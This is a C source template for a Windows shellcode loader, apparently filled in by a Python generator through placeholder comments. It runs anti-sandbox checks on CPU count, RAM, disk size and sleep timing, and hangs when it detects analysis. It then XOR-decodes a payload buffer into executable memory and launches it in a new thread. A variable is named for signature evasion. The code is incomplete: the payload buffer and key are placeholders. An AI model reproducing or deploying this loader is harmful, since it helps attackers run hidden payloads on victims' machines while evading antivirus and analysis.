
#include <windows.h>
#include <stdio.h>
#include <time.h>

unsigned long get_time()
{
	return (unsigned long)time(NULL);
}
void compute_ftp()
{
	int i = 0;
	while (1)
	{
		i++;
	}
	return;
}
int main(void)
{
	const char sig_evade[] = "// PYTHON_REPLACE_ME_HERE_1";
	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2)
		compute_ftp();

	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048)
		compute_ftp();

	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100)
		compute_ftp();

	unsigned long start = get_time();
	Sleep(3000);
	unsigned long end = get_time();
	if ((end - start) < 2)
	{

		compute_ftp();
	}

	if ((end - start) >= 2)
	{
		// PYTHON_REPLACE_ME_HERE_2
		const char key[] = // PYTHON_REPLACE_ME_HERE_3

			for (int i = 0; i < sizeof(buf); i++)
		{
			buf[i] = buf[i] ^ key[i % (sizeof(key) - 1)];
		}
		PVOID shellcode_exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		memcpy(shellcode_exec,buf,sizeof(buf));
		DWORD threadID;
		HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
		while (1);
		//WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}